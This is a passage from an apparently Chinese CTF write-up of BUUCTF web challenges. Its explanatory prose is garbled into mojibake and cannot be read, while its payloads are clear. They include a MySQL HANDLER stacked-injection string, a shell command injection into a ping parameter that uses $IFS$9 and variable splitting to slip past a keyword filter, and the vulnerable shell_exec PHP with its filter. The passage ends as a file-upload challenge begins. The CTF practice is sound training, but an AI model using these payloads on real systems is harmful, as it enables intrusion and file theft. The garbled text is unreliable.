class="keyword">NEXT</span>ç»§ç»­æµè§ˆã€‚</span><br></pre></td></tr></table></figure><p><u><code>å¥æŸ„ï¼šã€ç›¸å½“äºä¸€ä¸ªæŒ‡é’ˆï¼Œè¿™é‡Œæ˜¯æŒ‡å‘æ•°æ®åº“é‡Œçš„è¡¨ã€‘</code></u></p><h5 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h5><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line">3.1 åˆ›å»ºæµ‹è¯•è¡¨åŠæµ‹è¯•æ•°æ®</span><br><span class="line"></span><br><span class="line">create table handler<span class="emphasis">_table(  </span></span><br><span class="line"><span class="emphasis">    c1 int,   </span></span><br><span class="line"><span class="emphasis">    c2 varchar(10),   </span></span><br><span class="line"><span class="emphasis">    c3 int(10) </span></span><br><span class="line"><span class="emphasis">);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(2, &#x27;name2&#x27;, 002);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(5, &#x27;name5&#x27;, 005);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(1, &#x27;name1&#x27;, 001);  </span></span><br><span class="line"><span class="emphasis">insert into handler_table values(4, &#x27;name4&#x27;, 004);  </span></span><br><span class="line"><span class="emphasis">insert into handler_</span>table values(3, <span class="emphasis">&#x27;name3&#x27;</span>, 003);</span><br><span class="line"></span><br><span class="line">3.2 ä¸é€šè¿‡ç´¢å¼•æ‰“å¼€æŸ¥çœ‹è¡¨</span><br><span class="line"></span><br><span class="line">æ‰“å¼€å¥æŸ„ï¼šã€ç›¸å½“äºä¸€ä¸ªæŒ‡é’ˆã€‘</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open;</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹è¡¨æ•°æ®ï¼š</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read first;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    1 | name1 |    1 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler handler_table read next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line">mysql&gt; handler handler_table read next;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å…³é—­å¥æŸ„ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table close;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">3.3 é€šè¿‡ç´¢å¼•æ‰“å¼€æŸ¥çœ‹è¡¨ï¼ˆFIRST,NEXT,PREV,LASTï¼‰</span><br><span class="line">é€šè¿‡ç´¢å¼•æŸ¥çœ‹çš„è¯ï¼Œå¯ä»¥æŒ‰ç…§ç´¢å¼•çš„å‡åºï¼Œä»å°åˆ°å¤§ï¼ŒæŸ¥çœ‹è¡¨ä¿¡æ¯ã€‚</span><br><span class="line"></span><br><span class="line">åˆ›å»ºç´¢å¼•ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; create index handler_index on handler_table(c1);</span><br><span class="line"></span><br><span class="line">æ‰“å¼€å¥æŸ„ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open as p;</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹è¡¨æ•°æ®ï¼š</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index first;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    1 | name1 |    1 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index prev;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index last;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å…³é—­å¥æŸ„ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; handler p close;</span><br><span class="line"></span><br><span class="line">3.4 é€šè¿‡ç´¢å¼•æ‰“å¼€æŸ¥çœ‹è¡¨ï¼ˆ=,&lt;=,&gt;=,&lt;,&gt;ï¼‰</span><br><span class="line">ä»indexä¸º2çš„åœ°æ–¹å¼€å§‹</span><br><span class="line"></span><br><span class="line">æ‰“å¼€å¥æŸ„ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; handler handler_table open as p;</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹è¡¨æ•°æ®ï¼š</span><br><span class="line"></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index = (2);</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    2 | name2 |    2 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;     </span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    3 | name3 |    3 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    4 | name4 |    4 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index next;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">mysql&gt; handler p read handler_index last;</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">| c1   | c2    | c3   |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"><span class="section">|    5 | name5 |    5 |</span></span><br><span class="line"><span class="section">+------+-------+------+</span></span><br><span class="line"></span><br><span class="line">å…³é—­å¥æŸ„ï¼š</span><br><span class="line"></span><br><span class="line">mysql&gt; handler p close;</span><br><span class="line"></span><br><span class="line">3.5 é™„åŠ ï¼šè¯­æ³•å®ä¾‹å‚è€ƒ</span><br><span class="line"></span><br><span class="line">handler handler<span class="emphasis">_table open;</span></span><br><span class="line"><span class="emphasis">handler handler_table open as p;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first limit 3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next limit 3,3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read first where c1 &gt; 2 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read next where c1 &gt;2 limit 1,2;</span></span><br><span class="line"><span class="emphasis"> </span></span><br><span class="line"><span class="emphasis">create index handler_index on handler_table(c1);</span></span><br><span class="line"><span class="emphasis">handler handler_table open;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index first;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index next limit 3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index PREV limit 3,3;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index LAST where c1 &gt; 2 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index LAST where c1 &gt; 2 limit 1,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index = (3);</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &lt;= (3) limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &gt;= (3) limit 1,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &lt; (4)  where c1 &gt; 0 limit 2;</span></span><br><span class="line"><span class="emphasis">handler handler_table read handler_index &gt; (1)  where c1 &lt; 6 limit 2,2;</span></span><br><span class="line"><span class="emphasis">handler handler_table close;</span></span><br><span class="line"><span class="emphasis">drop index handler_index on handler_</span>table;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçœ‹æ‡‚ä»¥åï¼Œæˆ‘è‡ªå·±åˆé‡æ–°æ„é€ äº†ä¸€ä¸ª</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&#x27;; handler `<span class="number">19198109311145</span>14` open;handler `<span class="number">19198109311145</span>14` read first;</span><br></pre></td></tr></table></figure><p>æ•ˆæœä¸€æ ·ï¼Œæ„æ€ä¹Ÿå·®ä¸å¤š</p><p><img src="/2022/06/21/buuctf-wp/image-20220731224702281.png" alt="image-20220731224702281"></p><h2 id="2-GXYCTF2019-Ping-Ping-Ping"><a href="#2-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="2.[GXYCTF2019]Ping Ping Ping"></a>2.[GXYCTF2019]Ping Ping Ping</h2><h3 id="1-é¢˜ç›®æè¿°"><a href="#1-é¢˜ç›®æè¿°" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2-wp"><a href="#2-wp" class="headerlink" title="2)wp"></a>2)wp</h3><p>çœ‹åå­—åº”è¯¥æ˜¯é“å‘½ä»¤æ‰§è¡Œçš„é¢˜ç›®</p><p>å…ˆä¼ ä¸€ä¸ªIP:123.123.123.123è¯•è¯•</p><p><code>?ip=123.123.123.123</code></p><p><img src="/2022/06/21/buuctf-wp/image-20220706231831194.png" alt="image-20220706231831194"></p><p>çœ‹èµ·æ¥æ˜¯Linuxå‘½ä»¤ï¼Œå…ˆæ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶è¯•è¯•ï¼ˆ;æ˜¯é¡ºåºæ‰§è¡Œï¼Œä»å·¦å¾€å³ï¼Œå‘½ä»¤å…¨éƒ¨æ‰§è¡Œï¼‰</p><p><code>?ip=123.123.123.123;ls</code></p><p><img src="/2022/06/21/buuctf-wp/image-20220706232001574.png" alt="image-20220706232001574"></p><p>çœ‹åˆ°flagæ–‡ä»¶ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ç›´æ¥è¯»å‡º</p><p><img src="/2022/06/21/buuctf-wp/image-20220706232135596.png" alt="image-20220706232135596"></p><p>å‘ç°ï¼Œç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œæˆ‘è¯•è¯•äº†å¾ˆå¤šç»•è¿‡ï¼Œæ¯”å¦‚%0aï¼Œ%20ï¼Œ%09ï¼Œ&lt;&gt;ï¼Œä½†æ˜¯å›æ˜¾éƒ½æ˜¯</p><p><code>?ip=123.123.123.123;cat%0aflag.php</code></p><p><img src="/2022/06/21/buuctf-wp/image-20220706233818795.png" alt="image-20220706233818795"></p><p>æ„æ€æ˜¯ç¬¦å·éƒ½è¿‡æ»¤äº†</p><p>è¿™é‡Œå¼•å…¥æˆ‘ä¸€ä¸ªæ–°å­¦çš„ç©ºæ ¼ä»£æ›¿ç¬¦$IFS$9ï¼Œè¿™æ˜¯ä¸ªshellä¸­å®šä¹‰çš„ç¯å¢ƒå˜é‡ï¼Œåœ¨æ­¤å¤„å¯ä»¥ç»•è¿‡è¿‡æ»¤</p><p>$IFS$9ï¼ˆ$IFSæ˜¯<strong>Unix</strong>ç³»ç»Ÿçš„ä¸€ä¸ªé¢„è®¾å˜é‡è¡¨ç¤ºåˆ†éš”ç¬¦ï¼Œ$9åªæ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ï¼‰</p><p>è¯•è¯•</p><p><code>?ip=123.123.123.123;cat$IFS$9flag.php</code></p><p><img src="/2022/06/21/buuctf-wp/image-20220706234926216.png" alt="image-20220706234926216"></p><p>å‘ç°flagä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œé‚£å°±åªå¥½å…ˆçœ‹çœ‹index.phpæ–‡ä»¶ï¼Œè¯•è¯•èƒ½ä¸èƒ½çœ‹åˆ°å…¶ä»£ç </p><p><code>?ip=123.123.123.123;cat$IFS$9index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">&lt;pre&gt;/?ip=</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°ipæœ‰å¾ˆå¤šæ­£åˆ™åŒ¹é…çš„å­—ç¬¦ï¼Œæ‰€ä»¥æ²¡æœ‰é‚£ä¹ˆå®¹æ˜“ç»•è¿‡</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell_exec </span>â€” é€šè¿‡ <span class="keyword">shell </span>ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›ã€‚</span><br><span class="line"><span class="keyword">shell_exec(string </span>$cmd): string</span><br><span class="line">exec æ˜¯ <span class="keyword">Shell </span>å†…ç½®å‘½ä»¤ï¼Œå®ƒæœ‰ä¸¤ç§ç”¨æ³•ï¼Œä¸€ç§æ˜¯æ‰§è¡Œ <span class="keyword">Shell </span>å‘½ä»¤ï¼Œä¸€ç§æ˜¯æ“ä½œæ–‡ä»¶æè¿°ç¬¦</span><br><span class="line">ping -c <span class="built_in">Count</span> æŒ‡å®šè¦è¢«å‘é€ï¼ˆæˆ–æ¥æ”¶ï¼‰çš„å›é€ä¿¡å·è¯·æ±‚çš„æ•°ç›®ï¼Œç”± <span class="built_in">Count</span> å˜é‡æŒ‡å‡º</span><br><span class="line">--(æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åªèƒ½è¾“å…¥å››ä¸ªå­—ç¬¦)--</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">print_rå‡½æ•°ç”¨äºæ‰“å°å˜é‡ï¼Œä»¥æ›´å®¹æ˜“ç†è§£çš„å½¢å¼å±•ç¤º</span><br><span class="line"></span><br><span class="line">ä¾‹å­</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span> (<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;c&#x27;</span> =&gt; <span class="keyword">array</span> (<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>)); </span><br><span class="line"><span class="title function_ invoke__">print_r</span> (<span class="variable">$a</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è¾“å‡ºç»“æœ</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [a] =&gt; apple</span><br><span class="line">    [b] =&gt; banana</span><br><span class="line">    [c] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; x</span><br><span class="line">            [<span class="number">1</span>] =&gt; y</span><br><span class="line">            [<span class="number">2</span>] =&gt; z</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>flagè¿‡æ»¤è¯­å¥çš„æ„æ€åˆ¤æ–­æ˜¯å¦æŒ‰é¡ºåºå‡ºç°flag</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="built_in">if</span>(<span class="built_in">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åªè¦ipé‡Œçš„flagå‡ºç°ä¸æŒ‰é¡ºåºå°±è¡Œï¼Œä¹Ÿå°±æ˜¯flagå¦ä¸€ç§æ–¹å¼è¡¨ç¤º</p><p>æˆ‘ä»¬çœ‹æºç çŸ¥é“æœ‰ä¸¤ä¸ªå˜é‡ï¼Œä¸€ä¸ªæ˜¯$ip,$a</p><p>ipå˜é‡æ— æ³•æ”¹å˜ï¼Œå˜é‡aå¯ä»¥å°è¯•èµ‹å€¼flagè¯•è¯•èƒ½ä¸èƒ½ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Œä½†æ˜¯å¦‚æœæ˜¯a&#x3D;flagï¼Œå°±ä¼šé¡ºåºå‡ºç°flagï¼ŒåŒ¹é…ï¼Œæ‰€ä»¥è¯•è¯•a&#x3D;gï¼Œflagâ€“&gt;fla$a</p><p><code>?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code></p><p>æŸ¥çœ‹æºç </p><p>å¾—åˆ°flag</p><h2 id="3-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#3-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="3.[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>3.[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><h3 id="1-é¢˜ç›®æè¿°-1"><a href="#1-é¢˜ç›®æè¿°-1" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2-wp-1"><a href="#2-wp-1" class="headerlink" title="2)wp"></a>2)wp</h3><p> çœ‹æ ‡é¢˜çŸ¥é“è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®ï¼Œè¦æ±‚ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬</p><p><img src="/2022/06/21/buuctf-wp/image-20220710111959632.png" 